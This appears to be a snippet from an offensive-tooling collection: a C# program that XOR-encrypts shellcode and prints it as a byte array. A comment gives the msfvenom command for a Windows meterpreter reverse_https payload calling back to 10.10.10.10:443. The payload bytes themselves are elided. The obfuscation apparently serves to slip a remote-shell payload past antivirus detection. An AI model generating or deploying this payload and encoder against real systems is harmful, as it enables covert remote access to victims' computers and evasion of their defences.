## Shellcode Encryptor in Csharp Output Format

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f csharp
            byte[] xyz = new byte[661] {
0xfc,0x48,0x83,..0xd5 };

            int len = xyz.Length;

            //XOR Cipher
            //Key can be altered
            byte[] enc2 = new byte[xyz.Length];
            string xorKey = "abc123";

            for (int i = 0; i < xyz.Length; i++)
            {
                enc2[i] = (byte)(xyz[i] ^ xorKey[i % xorKey.Length]);
            }

            StringBuilder hexNo2 = new StringBuilder(enc2.Length * 2);
            foreach(byte b2 in enc2)
            {
                hexNo2.AppendFormat("0x{0:x2}, ", b2);
            }
            Console.WriteLine($"\nXORed Shellcode\nbyte[] buf = new byte[{len}] {{ {hexNo2.ToString()} }};");
        }
    }
}
```